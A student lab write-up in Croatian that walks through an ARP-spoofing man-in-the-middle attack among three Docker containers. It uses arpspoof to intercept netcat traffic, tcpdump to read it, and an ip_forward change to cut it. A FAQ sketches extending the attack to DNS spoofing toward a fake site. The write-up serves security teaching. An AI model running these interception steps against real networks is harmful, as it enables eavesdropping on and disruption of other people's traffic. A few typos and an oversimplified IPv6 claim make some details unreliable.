# Lab 1 - Man-in-the-middle attack (ARP spoofing)

### Cilj

Zadatak ove vježbe je da nas upozna s tipom MITM napada, ARP spoofing. Također da bi uspješno proveli vježbu upoznat ćemo se s osnovama linuxa i nekim njegovim alatima.

### Korištene tehnologije

- WSL(Windows Subsystem for Linux)
- Docker
- Git
- Linux alati
    - Netcat
    - Arpspoof

### Podizanje radne okoline

Prvo smo pokrenutilo WSL bash te smo u njemu izveli sljedeće naredbe.

Napravi novi direktorij s nazivom *bdurdo*. Zatim otvori taj direktorij i u njemu kloniraj GitHub repositorij.

```bash
mkdir bdurdo
cd bdurdo
git clone [https://github.com/mcagalj/SRP-2021-22](https://github.com/mcagalj/SRP-2021-22)
```

Zatim otvorimo *SRP-2021-22/arp-spoofing* direktorij te pokrenimo *.start.sh* koji će se pobrinuti za enviroment varijable, zaustavljanje i brisanje kontenjera ako postoje, izradu slika i pokretanje docker compose-a.

```bash
cd SRP-2021-22/
cd arp-spoofing/
./start.sh
```

Trenutno imamo podignuta 3 docker kontenjera koji su spojeni na zajedničku mrežu, te je okružje za laboratorijsku vježbu postavljeno.

Provjera jesu li kontenjeri stvarno podignuti

```bash
docker ps
```

Dodavanje više terminala na jednom prozoru → CTRL+SHIT+D

Pristupanje bash-u u svakom pojedinom pokrenutom kontenjeru

```bash
docker exec -it station-1 bash
docker exec -it station-2 bash
docker exec -it evil-station bash
```

Provjera konfiguracije mreže iz kontenjera

```bash
ifconfig -la
```

### Uspostavljanje komunikacije između servera

Provjera povezanosti kontenjera

```bash
ping station-2
```

Pokretanje netcat servera(*station-2*)

```bash
netcat -l -p 9000
```

Spajanje na netcat server(*station-1*)

```bash
netcat station-2 9000
```

Trenutno imamo spojen *station-1* i *station-2* te možemo razmjenjivati poruke između njih.

![Untitled](Lab1-Man-in-the-middleAttack(ARPspoofing)/Untitled.png)

### ARP spoof napad

Slušanje prometa

```bash
tcp dump
```

Kad pokrenemo ovo na *evil-station* ne vidimo pakete jer nam se nitko ni ne obraća

Preusmjeravanje prometa

- -t → target, onaj koga varamo
- -h → host - onaj kim se predstavljam

```bash
arpspoof -t station-1 station-2
```

OUTPUT:

> 2:42:ac:12:0:4 2:42:ac:12:0:2 0806 42: arp reply 172.18.0.3 is-at 2:42:ac:12:0:4
> 

Što bi u prijevodu značilo govorim switchu da je na tome IP taj(u ovome slučaju moj) MAC

Filtriranje prometa od *host* i *station-1*(bez ARP paketa)

```bash
tcpdump -X host station-1 and not arp
```

Sada kad pošaljemo poruku možemo je vidjeti bez ostalih paketa.

![Untitled](Lab1-Man-in-the-middleAttack(ARPspoofing)/Untitled%201.png)

Prekid prometa (između *station-1* i *station-1*)

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

Izlaz iz pojedinog bash-a docker kontenjerazzzzzz

```bash
exit
```

Zaustavljenje i ukljanjanje docker kontenjera

```bash
./stop.sh
```

### FAQ

- Zašto je ovaj napad moguć?
    
    Kada se ARP definiriao 1982, nije postojao Wi-Fi, niti se tolika pažnja pridavala na napade intrudera u lokalnim mrežama. Kod nove inačice IPv6 nemamo ARP spoofing napad.
    
- Ako smo blokirali promet *station-1* prema *station-2*, zašto je *station-2* mogao poslati samo 2 poruke prema *station-1* iako mu put prema *station-1* nije blokiran?
    
    Odgovor se nalazi u samom TCP protokolu koji je korišten u netcat-u, koji zahtjeva potvrdu o uspješnom primitku poruke. Tako da poruka je uspješno došla do *station-1,* ali on to nije mogao javiti station-2 jer je taj put blokiran. Pošto TCP layer na *station-2* nije dobio potvrdu o primitku te poslane poruke ni nakon prve, ni nakon druge, treću nismo uspili niti poslati do *station-1* jer nije prošla kroz TCP layer na *station-2,* popunio se batch (buffer poruka koje čekaju potvrdu) i nove se ne mogu poslati dok te ne dobiju potvrdu i maknu se iz batcha. Da smo podesili UDP protokol kod netcat-a uspješno bi mogli slati poruke jer UDP ne zahtjeva potvrdu o uspješnom primitku, pomoću "-u" u naredbi.
    
    ```bash
    netcat -u -l -p 9000
    netcat -u station-2 9000
    ```
    
- Dodatne mogućnosti?
    
    Zavarati klijenta da smo mi switch i kada zatraži neku stranicu pobrinemo se da se nalazi u našem dns recordu te da smo hostali server za nju pa ga usmjerimo na tu fake stranicu. Također modificiramo response time da sve bude realnije. Za sve ostale requestove port forward.